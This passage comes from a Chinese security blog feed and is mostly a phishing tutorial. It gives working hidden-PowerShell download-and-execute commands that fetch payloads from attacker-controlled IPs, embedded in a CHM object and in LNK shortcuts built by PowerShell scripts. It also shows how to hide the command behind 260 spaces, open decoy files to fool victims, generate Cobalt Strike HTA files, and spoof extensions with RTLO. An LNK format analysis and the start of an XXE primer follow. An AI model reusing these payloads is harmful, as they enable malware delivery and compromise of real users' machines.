class="string">&quot;ShortCut&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Bitmap::shortcut&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Item1&quot;</span> <span class="attr">value</span>=<span class="string">&quot;,powershell.exe, -nop -w hidden -c $Y=new-object net.webclient;if([System.Net.WebProxy]::GetDefaultProxy().address -ne $null)&#123;$Y.proxy=[Net.WebRequest]::GetSystemWebProxy();$Y.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;&#125;;IEX ([System.Text.Encoding]::ASCII.GetString($Y.downloaddata(&#x27;http://192.168.1.8:8080/EN7JqNv&#x27;)));&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">OBJECT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line">x.Click();</span><br><span class="line"><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这边以MSF作为演示</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Offer/14.png?raw=true" alt="2"></p><h2 id="LNK钓鱼"><a href="#LNK钓鱼" class="headerlink" title="LNK钓鱼"></a>LNK钓鱼</h2><p>制作快捷方式来钓鱼，需要创建两个文件</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Offer/15.png?raw=true" alt="1"></p><p>我们将任意一个快捷方式的“属性”中“目标”的值修改为如下字符串：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%SystemRoot%\system32\cmd.exe cmd /c powershell.exe -nop -w hidden -c IEX (new-object net.webclient).DownloadFile(<span class="string">&#x27;http://127.0.0.1/1.exe&#x27;</span>,<span class="string">&#x27;.\\1.exe&#x27;</span>);&amp;cmd /c .\\1.exe</span><br></pre></td></tr></table></figure><p>当我们再次运行这个快捷方式时，就达到了利用powershell从远程服务器下载文件到本地并执行的功能。这仅仅是其中一种用法，还有各种不同的方法都可以演化出来。就看你脑洞有多大。</p><p>快速生成lnk样本</p><ul><li><p>创建<strong>test.ps1</strong>文件</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$WshShell</span> = <span class="built_in">New-Object</span> <span class="literal">-comObject</span> WScript.Shell</span><br><span class="line"><span class="variable">$Shortcut</span> = <span class="variable">$WshShell</span>.CreateShortcut(<span class="string">&quot;test.lnk&quot;</span>)</span><br><span class="line"><span class="variable">$Shortcut</span>.TargetPath = <span class="string">&quot;%SystemRoot%\system32\cmd.exe&quot;</span></span><br><span class="line"><span class="variable">$Shortcut</span>.IconLocation = <span class="string">&quot;%SystemRoot%\System32\Shell32.dll,21&quot;</span></span><br><span class="line"><span class="variable">$Shortcut</span>.Arguments = <span class="string">&quot;cmd /c powershell.exe -nop -w hidden -c IEX (new-object net.webclient).DownloadFile(&#x27;http://192.168.1.7:8000/ascotbe.exe&#x27;,&#x27;.\\ascotbe.exe&#x27;);&amp;cmd /c .\\ascotbe.exe&quot;</span></span><br><span class="line"><span class="variable">$Shortcut</span>.Save()</span><br></pre></td></tr></table></figure></li><li><p>然后运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -ExecutionPolicy RemoteSigned -file test.ps1</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Offer/16.png?raw=true" alt="image-20200812214347733"></p><p>我们生成的恶意文件，接下来只要把这个文件发送给目标即可（你服务器一定要有ascotbe.exe这个文件）</p><p>在我们的服务器上生成个文件然后开个http服务</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Offer/17.png?raw=true" alt="image-20200812215457292"></p><p>然后目标机器运行我们的快捷方式</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Offer/18.png?raw=true" alt="image-20200812215620974"></p><p>接着我们只要把生成好的这个<strong>test</strong>快捷方式发送给目标，双击后就会收到系统上线了</p><h3 id="LNK文件格式解析"><a href="#LNK文件格式解析" class="headerlink" title="LNK文件格式解析"></a>LNK文件格式解析</h3><p>我们从二进制的格式来解读下LNK文件，完整文档可以看微软的文档</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;openspecs&#x2F;windows_protocols&#x2F;ms-shllink&#x2F;747629b3-b5be-452a-8101-b9a2ec49978c</span><br></pre></td></tr></table></figure><p>分析lnk文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Ascotbe&#x2F;Random-img&#x2F;blob&#x2F;master&#x2F;Offer&#x2F;%E7%81%AB%E7%BB%92%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6.lnk</span><br></pre></td></tr></table></figure><h4 id="头文件"><a href="#头文件" class="headerlink" title="头文件"></a>头文件</h4><p>前面有20个字节固定不变</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Offer/26.png?raw=true" alt="image-20200813164015856"></p><ul><li>HeaderSize(4 bytes, <code>offset 0x00</code>)：0x0000004C</li><li>LinkCLSID(16 bytes, <code>offset 0x04</code>)：00021401-0000-0000-C000-000000000046</li></ul><h4 id="LinkFlags"><a href="#LinkFlags" class="headerlink" title="LinkFlags"></a>LinkFlags</h4><p><code>offset 0x14</code>起始4字节为<strong>LinkFlags</strong></p><table><thead><tr><th align="left">0</th><th align="left">1</th><th align="left">2</th><th align="left">3</th><th align="left">4</th><th align="left">5</th><th align="left">6</th><th align="left">7</th><th align="left">8</th><th align="left">9</th><th align="left">1 0</th><th align="left">1</th><th align="left">2</th><th align="left">3</th><th align="left">4</th><th align="left">5</th><th align="left">6</th><th align="left">7</th><th align="left">8</th><th align="left">9</th><th align="left">2 0</th><th align="left">1</th><th align="left">2</th><th align="left">3</th><th align="left">4</th><th align="left">5</th><th align="left">6</th><th align="left">7</th><th align="left">8</th><th align="left">9</th><th align="left">3 0</th><th align="left">1</th></tr></thead><tbody><tr><td align="left">A</td><td align="left">B</td><td align="left">C</td><td align="left">D</td><td align="left">E</td><td align="left">F</td><td align="left">G</td><td align="left">H</td><td align="left">I</td><td align="left">J</td><td align="left">K</td><td align="left">L</td><td align="left">M</td><td align="left">N</td><td align="left">O</td><td align="left">P</td><td align="left">Q</td><td align="left">R</td><td align="left">S</td><td align="left">T</td><td align="left">U</td><td align="left">V</td><td align="left">W</td><td align="left">X</td><td align="left">Y</td><td align="left">Z</td><td align="left">A A</td><td align="left">0</td><td align="left">0</td><td align="left">0</td><td align="left">0</td><td align="left">0</td></tr></tbody></table><p>解释如下</p><table><thead><tr><th align="left">Value</th><th align="left">Description</th></tr></thead><tbody><tr><td align="left">A  <code>HasLinkTargetIDList</code></td><td align="left">The shell link is saved with an <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/ac7b5968-68f5-4e5c-8b11-00a6f4ae98ff#gt_ae01eca8-1cd4-4472-8be6-bd5d3ab4d01c">item ID list (IDList)</a>. If this bit is set, a <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/881d7a83-07a5-4702-93e3-f9fc34c3e1e4">LinkTargetIDList</a> structure (section 2.2) MUST follow the ShellLinkHeader. If this bit is not set, this structure MUST NOT be present.</td></tr><tr><td align="left">B  <code>HasLinkInfo</code></td><td align="left">The shell link is saved with link information. If this bit is set, a <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/6813269d-0cc8-4be2-933f-e96e8e3412dc">LinkInfo</a> structure (section 2.3) MUST be present. If this bit is not set, this structure MUST NOT be present.</td></tr><tr><td align="left">C  <code>HasName</code></td><td align="left">The shell link is saved with a name string. If this bit is set, a <strong>NAME_STRING</strong> <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/17b69472-0f34-4bcf-b290-eccdb8de224b">StringData</a> structure (section 2.4) MUST be present. If this bit is not set, this structure MUST NOT be present.</td></tr><tr><td align="left">D  <code>HasRelativePath</code></td><td align="left">The shell link is saved with a <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/ac7b5968-68f5-4e5c-8b11-00a6f4ae98ff#gt_f0a8c9c7-1368-4989-addb-4792c3206387">relative path</a> string. If this bit is set, a <strong>RELATIVE_PATH</strong> StringData structure (section 2.4) MUST be present. If this bit is not set, this structure MUST NOT be present.</td></tr><tr><td align="left">E  <code>HasWorkingDir</code></td><td align="left">The shell link is saved with a working directory string. If this bit is set, a <strong>WORKING_DIR</strong> StringData structure (section 2.4) MUST be present. If this bit is not set, this structure MUST NOT be present.</td></tr><tr><td align="left">F  <code>HasArguments</code></td><td align="left">The shell link is saved with command line arguments. If this bit is set, a <strong>COMMAND_LINE_ARGUMENTS</strong> StringData structure (section 2.4) MUST be present. If this bit is not set, this structure MUST NOT be present.</td></tr><tr><td align="left">G  <code>HasIconLocation</code></td><td align="left">The shell link is saved with an icon location string. If this bit is set, an <strong>ICON_LOCATION</strong> StringData structure (section 2.4) MUST be present. If this bit is not set, this structure MUST NOT be present.</td></tr><tr><td align="left">H  <code>IsUnicode</code></td><td align="left">The shell link contains Unicode encoded strings. This bit SHOULD be set. If this bit is set, the StringData section contains Unicode-encoded strings; otherwise, it contains strings that are encoded using the system default code page.</td></tr><tr><td align="left">I  <code>ForceNoLinkInfo</code></td><td align="left">The LinkInfo structure (section 2.3) is ignored.</td></tr><tr><td align="left">J  <code>HasExpString</code></td><td align="left">The shell link is saved with an <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/2224d03c-f417-44a0-81e3-df169938ba72">EnvironmentVariableDataBlock (section 2.5.4)</a>.</td></tr><tr><td align="left">K  <code>RunInSeparateProcess</code></td><td align="left">The target is run in a separate virtual machine when launching a <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/ac7b5968-68f5-4e5c-8b11-00a6f4ae98ff#gt_3b9c7b80-c157-438a-b53a-dbe935ec3243">link target</a> that is a 16-bit application.</td></tr><tr><td align="left">L  <code>Unused1</code></td><td align="left">A bit that is undefined and MUST be ignored.</td></tr><tr><td align="left">M  <code>HasDarwinID</code></td><td align="left">The shell link is saved with a <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/48f8a4c4-99fe-4787-a39f-b1367103eba8">DarwinDataBlock (section 2.5.3)</a>.</td></tr><tr><td align="left">N  <code>RunAsUser</code></td><td align="left">The application is run as a different user when the target of the shell link is activated.</td></tr><tr><td align="left">O<code>HasExpIcon</code></td><td align="left">The shell link is saved with an <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/9e6b7dfe-2ca2-4875-a0c9-8d75ee4f9b65">IconEnvironmentDataBlock (section 2.5.5)</a>.</td></tr><tr><td align="left">P  <code>NoPidlAlias</code></td><td align="left">The file system location is represented in the shell <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/ac7b5968-68f5-4e5c-8b11-00a6f4ae98ff#gt_165fda5c-ed85-42c2-bd8c-1bbbde70cee9">namespace</a> when the path to an item is parsed into an IDList.</td></tr><tr><td align="left">Q  <code>Unused2</code></td><td align="left">A bit that is undefined and MUST be ignored.</td></tr><tr><td align="left">R  <code>RunWithShimLayer</code></td><td align="left">The shell link is saved with a <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/bde812e5-5af0-4db9-a7e3-4a46e91c873a">ShimDataBlock (section 2.5.8)</a>.</td></tr><tr><td align="left">S  <code>ForceNoLinkTrack</code></td><td align="left">The <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/df8e3748-fba5-4524-968a-f72be06d71fc">TrackerDataBlock (section 2.5.10)</a> is ignored.</td></tr><tr><td align="left">T  <code>EnableTargetMetadata</code></td><td align="left">The shell link attempts to collect target properties and store them in the <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/36463387-0708-40f6-a3a5-452fe42be585">PropertyStoreDataBlock (section 2.5.7)</a> when the link target is set.</td></tr><tr><td align="left">U  <code>DisableLinkPathTracking</code></td><td align="left">The EnvironmentVariableDataBlock is ignored.</td></tr><tr><td align="left">V  <code>DisableKnownFolderTracking</code></td><td align="left">The <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/8833199d-fc03-4535-8011-ba36c4b3ad5f">SpecialFolderDataBlock (section 2.5.9)</a> and the <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/5c7410e4-ec19-4ec5-8fff-cf4ccc46c5b6">KnownFolderDataBlock (section 2.5.6)</a> are ignored when loading the shell link. If this bit is set, these extra data blocks SHOULD NOT be saved when saving the shell link.</td></tr><tr><td align="left">W  <code>DisableKnownFolderAlias</code></td><td align="left">If the <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/ac7b5968-68f5-4e5c-8b11-00a6f4ae98ff#gt_6cfb1417-9127-43fa-ad5b-1ddcc3d270a5">link</a> has a KnownFolderDataBlock (section 2.5.6), the unaliased form of the known folder IDList SHOULD be used when translating the target IDList at the time that the link is loaded.</td></tr><tr><td align="left">X  <code>AllowLinkToLink</code></td><td align="left">Creating a link that references another link is enabled. Otherwise, specifying a link as the target IDList SHOULD NOT be allowed.</td></tr><tr><td align="left">Y  <code>UnaliasOnSave</code></td><td align="left">When saving a link for which the target IDList is under a known folder, either the unaliased form of that known folder or the target IDList SHOULD be used.</td></tr><tr><td align="left">Z  <code>PreferEnvironmentPath</code></td><td align="left">The target IDList SHOULD NOT be stored; instead, the path specified in the EnvironmentVariableDataBlock (section 2.5.4) SHOULD be used to refer to the target.</td></tr><tr><td align="left">AA  <code>KeepLocalIDListForUNCTarget</code></td><td align="left">When the target is a <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/ac7b5968-68f5-4e5c-8b11-00a6f4ae98ff#gt_c9507dca-291d-4fd6-9cba-a9ee7da8c908">UNC</a> name that refers to a location on a local machine, the local path IDList in the PropertyStoreDataBlock (section 2.5.7) SHOULD be stored, so it can be used when the link is loaded on the local machine.</td></tr></tbody></table><p>可以在<strong>010 Editor</strong>中看到，1表示设置的，0表示未设置的</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Offer/27.png?raw=true" alt="image-20200813170527371"></p><h4 id="FileAttributes"><a href="#FileAttributes" class="headerlink" title="FileAttributes"></a>FileAttributes</h4><p>由<code>offset 0x18</code>起始<code>4</code>字节为<strong>FileAttributes</strong> <code> 0x00000020</code>表示<strong>FILE_ATTRIBUTE_ARCHIVE</strong></p><h4 id="CreateTime-amp-AccessTime-amp-WriteTime"><a href="#CreateTime-amp-AccessTime-amp-WriteTime" class="headerlink" title="CreateTime &amp; AccessTime &amp; WriteTime"></a>CreateTime &amp; AccessTime &amp; WriteTime</h4><p>由<code>offset 0x1C</code>开始，每个字段各占<code>8</code>字节：</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Offer/28.png?raw=true" alt="image-20200813170742853"></p><h4 id="FileSize"><a href="#FileSize" class="headerlink" title="FileSize"></a>FileSize</h4><p>由<code>offset 0x34</code>起始<strong>FileSize</strong>为<code>0x000C0B10</code>(占<code>4</code>个字节)</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Offer/29.png?raw=true" alt="image-20200813171033900"></p><h4 id="IconIndex"><a href="#IconIndex" class="headerlink" title="IconIndex"></a>IconIndex</h4><p><strong>IconIndex</strong>为<code>0x00000000</code>(占<code>4</code>个字节)。</p><h4 id="ShowCommand-amp-Hotkey"><a href="#ShowCommand-amp-Hotkey" class="headerlink" title="ShowCommand &amp; Hotkey"></a>ShowCommand &amp; Hotkey</h4><p>由<code>offset 0x3C</code>开始，<strong>ShowCommand</strong>占<code>4</code>字节，<strong>0x00000001</strong>表示<code>SW_SHOWNORMAL</code>,当然也可以根据具体的需要替换为<code>SW_SHOWMAXIMIZED (0x00000003)</code>(<strong>窗口最大化</strong>)以及<code>SW_SHOWMINNOACTIVE (0x00000007)</code>(<strong>窗口最小化</strong>)</p><p><strong>Hotkey</strong>占<code>2</code>字节；余下<code>10</code>个字节均为保留位。</p><h4 id="LinkTargetIDList"><a href="#LinkTargetIDList" class="headerlink" title="LinkTargetIDList"></a>LinkTargetIDList</h4><p>由<code>offset 0x4C</code>开始，两个字节表示大小，这个位置就是一个一个文件夹拼接起来的一个完整路径，这边测试的完整路径**”C:\Program Files (x86)\Huorong\Sysdiag\bin\HipsMain.exe”**</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Offer/30.png?raw=true" alt="image-20200813172205813"></p><p>第一个ItemID为CLSID_MyComputer</p><p>第二个ItemID,其含义为<strong>c:</strong></p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Offer/31.png?raw=true" alt="image-20200813172621938"></p><p>第三个ItemID,第二层级路径</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Offer/32.png?raw=true" alt="image-20200813172831624"></p><p>第四个ItemID-第6个ItemID</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Offer/33.png?raw=true" alt="image-20200813173247917"></p><h4 id="LinkInfo"><a href="#LinkInfo" class="headerlink" title="LinkInfo"></a>LinkInfo</h4><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Offer/34.png?raw=true" alt="image-20200813173515708"></p><h4 id="String-Data"><a href="#String-Data" class="headerlink" title="String Data"></a>String Data</h4><p>StringData WORKING_DIR这个字段是起始位置的值</p><p>StringData ICON_LOCATION这个字段是图标位置的值</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Offer/35.png?raw=true" alt="image-20200813173754425"></p><h4 id="EXTRA-DATA"><a href="#EXTRA-DATA" class="headerlink" title="EXTRA_DATA"></a>EXTRA_DATA</h4><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Offer/36.png?raw=true" alt="EXTRA_DATA"></p><blockquote><p>这边记个小TOP</p></blockquote><ul><li><p>目标文件位置所能显示最大字符串为260个，所有我们可以把执行的命令放在260个字符后面，具体生成PS脚本如下</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="built_in">Get-Content</span> <span class="string">&quot;.\test.txt&quot;</span></span><br><span class="line"><span class="variable">$WshShell</span> = <span class="built_in">New-Object</span> <span class="literal">-comObject</span> WScript.Shell</span><br><span class="line"><span class="variable">$Shortcut</span> = <span class="variable">$WshShell</span>.CreateShortcut(<span class="string">&quot;test.lnk&quot;</span>)</span><br><span class="line"><span class="variable">$Shortcut</span>.TargetPath = <span class="string">&quot;%SystemRoot%\system32\cmd.exe&quot;</span></span><br><span class="line"><span class="variable">$Shortcut</span>.IconLocation = <span class="string">&quot;%SystemRoot%\System32\Shell32.dll,21&quot;</span></span><br><span class="line"><span class="variable">$Shortcut</span>.Arguments = <span class="string">&#x27;                                                                                                                                                                                                                                      &#x27;</span>+ <span class="variable">$file</span></span><br><span class="line"><span class="variable">$Shortcut</span>.Save()</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Offer/37.png?raw=true" alt="image-20200814175119204"></p></li><li><p>我们可以在执行完shell后再从服务器上下载个伪装文件，并且打开他，用来迷惑目标（比如你做的钓鱼文件是PDF的那你就下载个PDF正常的打开他），这边测试下载两个文件，一个是CMD一个powershell（下面的代码是上面所说的test.txt中的代码）</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/c powershell <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="literal">-c</span> <span class="string">&quot;IEX ((new-object net.webclient).DownloadFile(&#x27;http://192.168.0.126:8000/cmd.exe&#x27;,&#x27;1.exe&#x27;))&quot;</span>;&amp;powershell <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="literal">-c</span> <span class="string">&quot;IEX ((new-object net.webclient).DownloadFile(&#x27;http://192.168.0.126:8000/powershell.exe&#x27;,&#x27;2.exe&#x27;))&quot;</span> ;&amp;powershell <span class="built_in">start-process</span> <span class="string">&#x27;.\1.exe&#x27;</span>;&amp;powershell <span class="built_in">start-process</span> <span class="string">&#x27;.\2.exe&#x27;</span></span><br></pre></td></tr></table></figure><p>最终效果如下</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Offer/38.gif?raw=true" alt="2"></p></li></ul><h2 id="HTA钓鱼"><a href="#HTA钓鱼" class="headerlink" title="HTA钓鱼"></a>HTA钓鱼</h2><p>HTA是HTML Application的缩写，直接将HTML保存成HTA的格式，是一个独立的应用软件。<br>HTA虽然用HTML、JS和CSS编写，却比普通网页权限大得多，它具有桌面程序的所有权限。<br>就是一个html应用程序，双击就能运行。</p><p>Cobalt Strike生成方式：attacks——&gt;packages——&gt;HTML application</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Offer/19.png?raw=true" alt="image-20200812182253747"></p><p>点击生成后把.hta文件发送给目标，目标运行后就可以看到机器上线了</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Offer/20.png?raw=true" alt="image-20200812182638955"></p><h2 id="文件后缀RTLO"><a href="#文件后缀RTLO" class="headerlink" title="文件后缀RTLO"></a>文件后缀RTLO</h2><p>伪装文件中有个比较古老的方式，但依然会在攻击中看到它的身影。RTLO字符全名为“RIGHT-TO-LEFT OVERRIDE”，是一个不可显示的控制类字符，其本质是unicode 字符。可以将任意语言的文字内容按倒序排列，最初是用来支持一些从右往左写的语言的文字，比如阿拉伯语，希伯来语。由于它可以重新排列字符的特性，会被攻击者利用从而达到欺骗目标，使得用户运行某些具有危害性的可执行文件。</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>制作方式就是这样的，他会让字符串倒着编码</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Offer/21.png?raw=true" alt="image-20200813105304237"></p><h3 id="简单的生成"><a href="#简单的生成" class="headerlink" title="简单的生成"></a>简单的生成</h3><p>用Python一键生成用，把txt改为png后缀</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.rename(<span class="string">&#x27;ascotbe.txt&#x27;</span>, <span class="string">&#x27;ascotbe-\u202egnp.txt&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Offer/22.png?raw=true" alt="image-20200813110156755"></p><p>可以看到我们吧<strong>ascotbe.txt</strong>改成了<strong>ascotbe-txt.png</strong>并且还是个文本文档类型</p><h3 id="生成钓鱼文件"><a href="#生成钓鱼文件" class="headerlink" title="生成钓鱼文件"></a>生成钓鱼文件</h3><p>如果是exe文件的话可以替换图标，来进行迷惑行为，我们先生成一个魅惑名字的文件</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Offer/23.png?raw=true" alt="image-20200813111611299"></p><p>运行python脚本</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Offer/24.png?raw=true" alt="image-20200813111646139"></p><p>然后我们用Resource Hacker替换图标</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Offer/25.png?raw=true" alt="image-20200813114403776"></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;bhdresh&#x2F;CVE-2017-0199</span><br><span class="line">https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;850d1363abc5</span><br><span class="line">https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s?__biz&#x3D;MzAwMzYxNzc1OA&#x3D;&#x3D;&amp;mid&#x3D;2247485861&amp;idx&#x3D;1&amp;sn&#x3D;a4b87208c753c317240c7ae063871cdb&amp;chksm&#x3D;9b392f14ac4ea60240ca3c84f39f65a3b5584a08dbcf07b6962c3464ae282c3a1003fa3de37a&amp;scene&#x3D;126&amp;sessionid&#x3D;1596119031&amp;key&#x3D;25e1725a9070fca2a709c8a9cb837164ccd0b43058ae37339d865f113689c2ed541a337af3977dc16e95d85b32d7227c74f6df7e543f6d7634aced40e7cca665ce2895f15fe993763124fd2fa7c10091&amp;ascene&#x3D;1&amp;uin&#x3D;MTAzNzIzNDc2MQ%3D%3D&amp;devicetype&#x3D;Windows+10+x64&amp;version&#x3D;62090529&amp;lang&#x3D;zh_CN&amp;exportkey&#x3D;Aeo1t2sb2ZHnz3Nz8kzqLmw%3D&amp;pass_ticket&#x3D;DQWeM2sy7zmodhMi%2BT8fLsw34y3Tz9aBp44VMrGf14Nmcl7qS6hcq5YMCuQUdGSU</span><br><span class="line">http:&#x2F;&#x2F;zijieke.com&#x2F;d&#x2F;172</span><br><span class="line">https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;openspecs&#x2F;windows_protocols&#x2F;ms-shllink&#x2F;c3376b21-0931-45e4-b2fc-a48ac0e60d15</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>XXE的一些利用方式</title>
    <link href="https://www.ascotbe.com/2020/07/24/XXE/"/>
    <id>https://www.ascotbe.com/2020/07/24/XXE/</id>
    <published>2020-07-24T13:45:42.000Z</published>
    <updated>2021-05-04T06:03:28.064Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>声明</p></blockquote><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p><blockquote><p>前言</p></blockquote><p>对没错这是这星期的第四篇文章了，我感觉要肝不动了啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊</p><img src="https://github.com/Ascotbe/Random-img/blob/master/XXE/12.png?raw=true" alt="image-20200729093326798" style="zoom:50%;" /><h3 id="XXE是什么"><a href="#XXE是什么" class="headerlink" title="XXE是什么"></a>XXE是什么</h3><p>XXE(XML External Entity Injection) 全称为 XML 外部实体注入，从名字就能看出来，这是一个注入漏洞，注入的是什么？XML外部实体。(看到这里肯定有人要说：你这不是在废话)，固然，其实我这里废话只是想强调我们的利用点是 <strong>外部实体</strong> ，也是提醒读者将注意力集中于外部实体中，而不要被 XML 中其他的一些名字相似的东西扰乱了思维(<strong>盯好外部实体就行了</strong>)，如果能注入 外部实体并且成功解析的话，这就会大大拓宽我们 XML 注入的攻击面（这可能就是为什么单独说 而没有说 XML 注入的原因吧，或许普通的 XML 注入真的太鸡肋了，现实中几乎用不到）</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/XXE/1.png?raw=true" alt="img"></p><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>XML是一种用于标记电子文件使其具有结构性的标记语言，用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p><p>XML 文档有自己的一个格式规范，这个格式规范是由一个叫做 DTD（document type definition） 的东西控制的，他就是长得下面这个样子</p><p><strong>示例代码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&#x2F;&#x2F;这一行是 XML 文档定义</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">&lt;!ELEMENT message (receiver ,sender ,header ,msg)&gt;</span><br><span class="line">&lt;!ELEMENT receiver (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT sender (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT header (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT msg (#PCDATA)&gt;</span><br></pre></td></tr></table></figure><p>上面这个 DTD 就定义了 XML 的根元素是 message，然后跟元素下面有一些子元素，那么 XML 到时候必须像下面这么写</p><p><strong>示例代码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;message&gt;</span><br><span class="line">&lt;receiver&gt;Myself&lt;&#x2F;receiver&gt;</span><br><span class="line">&lt;sender&gt;Someone&lt;&#x2F;sender&gt;</span><br><span 